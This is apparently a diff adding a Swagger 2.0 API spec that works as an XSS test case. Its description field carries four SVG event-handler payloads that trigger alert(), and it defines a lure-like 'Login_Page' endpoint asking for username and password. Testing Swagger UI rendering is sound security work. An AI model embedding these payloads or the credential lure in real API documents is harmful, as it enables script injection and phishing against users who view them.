@@ -1,0 +1,30 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: 'Swagger UI'
+  description: 'SVG: <svg onload=alert(1)></svg> <svg><animate onbegin=alert(2) attributeName=x dur=1s></svg> <svg><set attributeName=onmouseover to=alert(3)></svg> <svg><animateTransform onend=alert(4)></svg>'
+paths:
+  /Login_Page:
+    post:
+      summary: Login here to continue
+      description: Please provide your credentials to continue.
+      parameters:
+        - name: username
+          in: formData
+          description: The username for login
+          required: true
+          type: string
+        - name: password
+          in: formData
+          description: The password for login
+          required: true
+          type: string
+      tags:
+        - Click here to login
+      responses:
+        '200':
+          description: OK
+        '400':
+          description: Bad request
+        '500':
+          description: Server error
